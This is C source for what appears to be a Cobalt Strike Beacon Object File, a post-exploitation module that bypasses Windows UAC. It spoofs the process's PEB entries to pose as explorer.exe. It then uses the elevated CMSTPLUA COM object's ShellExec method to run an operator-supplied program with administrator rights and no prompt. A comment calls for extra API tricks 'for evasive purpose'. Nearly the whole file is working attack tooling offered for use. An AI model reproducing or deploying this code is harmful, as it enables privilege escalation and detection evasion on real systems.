#include <Windows.h>
#include "../../include/beacon.h"
#include "../../include/Structs.h"
#pragma intrinsic(memcmp, memcpy,strcpy,strcmp,_stricmp,strlen, memset)

//------------------------------DEFINING STUFFS--------------------------------------------
typedef NTSTATUS (NTAPI*_RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

typedef NTSTATUS (NTAPI*_RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

typedef void (WINAPI*_RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

#define MemCopy __movsb
#define MemSet __stosb
#define PRNT_WN_ERR(szWnApiName) BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: %d \n", szWnApiName, KERNEL32$GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)     BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

#define DELETE_HANDLE(H)                                \
if (H != NULL && H != INVALID_HANDLE_VALUE){        \
KERNEL32$CloseHandle(H);                        \
H = NULL;                                       \
}

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE

    HRESULT (STDMETHODCALLTYPE*QueryInterface)(__RPC__in ICMLuaUtil *This, __RPC__in REFIID riid,
                                               _COM_Outptr_ void **ppvObject);

    ULONG (STDMETHODCALLTYPE*AddRef)(__RPC__in ICMLuaUtil *This);

    ULONG (STDMETHODCALLTYPE*Release)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method1)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method2)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method3)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method4)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method5)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*Method6)(__RPC__in ICMLuaUtil *This);

    HRESULT (STDMETHODCALLTYPE*ShellExec)(__RPC__in ICMLuaUtil *This, _In_ LPCTSTR lpFile,
                                          _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask,
                                          _In_ ULONG nShow);

    END_INTERFACE
} *PICMLuaUtilVtbl;

/**
 * Define ICMLuaUtil interface with ICMLuaUtil VTBL
 */
interface ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};

//-----------------------------------IMPORTS---------------------------------------

DECLSPEC_IMPORT NTSTATUS NTDLL$RtlEnterCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
);

DECLSPEC_IMPORT NTSTATUS NTDLL$RtlLeaveCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
);

DECLSPEC_IMPORT VOID NTDLL$RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

//
DECLSPEC_IMPORT UINT KERNEL32$GetWindowsDirectoryW(
    LPWSTR lpBuffer,
    UINT uSize
);

//
DECLSPEC_IMPORT UINT KERNEL32$GetModuleFileNameW(
    HMODULE hModule,
    LPWSTR lpFilename,
    DWORD nSize
);

DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr,
                                                        int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

DECLSPEC_IMPORT LPVOID KERNEL32$VirtualAlloc(
    LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect
);

DECLSPEC_IMPORT errno_t MSVCRT$wcscat_s(
    wchar_t *_Dst,
    rsize_t _SizeInWords,
    const wchar_t *_Src
);

//
DECLSPEC_IMPORT errno_t MSVCRT$wcscpy_s(
    wchar_t *_Dst, rsize_t _SizeInWords, const wchar_t *_Src
);

DECLSPEC_IMPORT int MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize(void);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc,
                                                          SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1,
                                                          DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList,
                                                          DWORD dwCapabilities, void *pReserved3);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext,
                                                      REFIID riid, LPVOID *ppv);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString(LPCOLESTR lpsz, LPIID lpiid);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoGetObject(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv);

DECLSPEC_IMPORT int WINAPI OLE32$StringFromGUID2(REFGUID rguid, LPOLESTR lpsz, int cchMax);

/*
 *Use https://github.com/vxunderground/VX-API/blob/main/VX-API/CreateWindowsObjectPath.cpp
 *Use VX-API instead of importing from dll for evasive purpose
 *
 */
//--------------------------------------------------------------------------


PEB *GetPeb() {
#ifdef _M_X64
    return (void *) __readgsqword(0x60);
#elif _M_IX86
    return (void*)__readfsdword(0x30);
#endif
}

SIZE_T CharStringToWCharString(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed) {
    INT Length = MaximumAllowed;

    while (--Length >= 0) {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

// spoof process
BOOL SpoofExplorerProcess() {
    BeaconPrintf(CALLBACK_OUTPUT, "\t Getting explorer.exe path \n");
    WCHAR chExplorerPath[MAX_PATH];
    KERNEL32$GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
    MSVCRT$wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
    KERNEL32$VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPWSTR pwExplorerPath = (LPWSTR) KERNEL32$VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    MSVCRT$wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);
    BeaconPrintf(CALLBACK_OUTPUT, "Explorer.exe path: %S \n", pwExplorerPath);
    PEB *pPeb = GetPeb();
    NTSTATUS STATUS = NTDLL$RtlEnterCriticalSection(pPeb->FastPebLock);
    if (STATUS != 0x00) {
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\t- Masquerading ImagePathName and CommandLine.\n");
    // Change path name to explorer
    NTDLL$RtlInitUnicodeString(&pPeb->ProcessParameters->ImagePathName, chExplorerPath);
    NTDLL$RtlInitUnicodeString(&pPeb->ProcessParameters->CommandLine, chExplorerPath);

    PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY) pPeb->LoaderData->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pPeb->LoaderData->InLoadOrderModuleList.Flink;

    WCHAR wExeFileName[MAX_PATH];
    KERNEL32$GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

    do {
        if (MSVCRT$_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "\t- Masquerading FullDllName and BaseDllName.\n");
            NTDLL$RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
            NTDLL$RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
            break;
        }

        pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY) pNextModuleInfo->InLoadOrderLinks.Flink;
    } while (pNextModuleInfo != pStartModuleInfo);

    NTDLL$RtlLeaveCriticalSection(pPeb->FastPebLock);
    return TRUE;
}

HRESULT ComUacBypass(PWCHAR pszProgram, PWCHAR pszArguments) {
    HRESULT hResult = 0x00;
    ICMLuaUtil *pICMLuaUtil = NULL;
    IID hIID_ICMLuaUtil;
    IBindCtx *iBindContext = NULL;
    IMoniker *iMoniker = NULL;
    BIND_OPTS3 sBindingOpts;
    hResult = OLE32$CoInitialize(NULL);

    if (hResult < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitilize failed  0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    if (OLE32$IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &hIID_ICMLuaUtil) != 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not get IID from ICMLuaUtil GUID \n");
        goto CLEANUP_AND_RETURN;
    }
    MemSet((PVOID) &sBindingOpts, 0, sizeof(sBindingOpts));
    sBindingOpts.cbStruct = sizeof(sBindingOpts);
    sBindingOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
    hResult = OLE32$CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
                                (BIND_OPTS *) &sBindingOpts, &hIID_ICMLuaUtil, (void **) &pICMLuaUtil);
    if (hResult < 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to run CoGetObject: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    // Copy the actual file
    hResult = pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, (LPSTR) pszProgram, (LPSTR) pszArguments, NULL,
                                             SEE_MASK_DEFAULT, SW_SHOW);
    if (hResult < 0x00) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to run ShellExec: 0x%X.\n", hResult);
        goto CLEANUP_AND_RETURN;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Succesfully executed shell!");
CLEANUP_AND_RETURN:
    if (pICMLuaUtil != NULL) pICMLuaUtil->lpVtbl->Release(pICMLuaUtil);
    if (iMoniker != NULL) iMoniker->lpVtbl->Release(iMoniker);
    if (iBindContext != NULL) iBindContext->lpVtbl->Release(iBindContext);
    OLE32$CoUninitialize();
    return hResult;
};

void go(char *args, int argc) {
    datap Parser = {0};
    DWORD Length = {0};
    PSTR  executePath = { 0 };
    PSTR shellArgs = {0};
    PWCHAR pszProgram = (PWCHAR) KERNEL32$VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PWCHAR pszArgs= (PWCHAR) KERNEL32$VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Parse arguments
    BeaconDataParse(&Parser, args, argc);
    executePath = BeaconDataExtract(&Parser, &Length);
    shellArgs = BeaconDataExtract(&Parser, &Length);

    CharStringToWCharString(pszProgram, executePath, MAX_PATH);
    CharStringToWCharString(pszArgs, shellArgs, MAX_PATH);

    if (!SpoofExplorerProcess()) {
        BeaconPrintf(CALLBACK_ERROR, "Spoofing process explorere failed \n");
    }
    if (ComUacBypass(pszProgram, pszArgs) == 0x00) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully launched %S %S\n", pszProgram, pszArgs);
    }
}

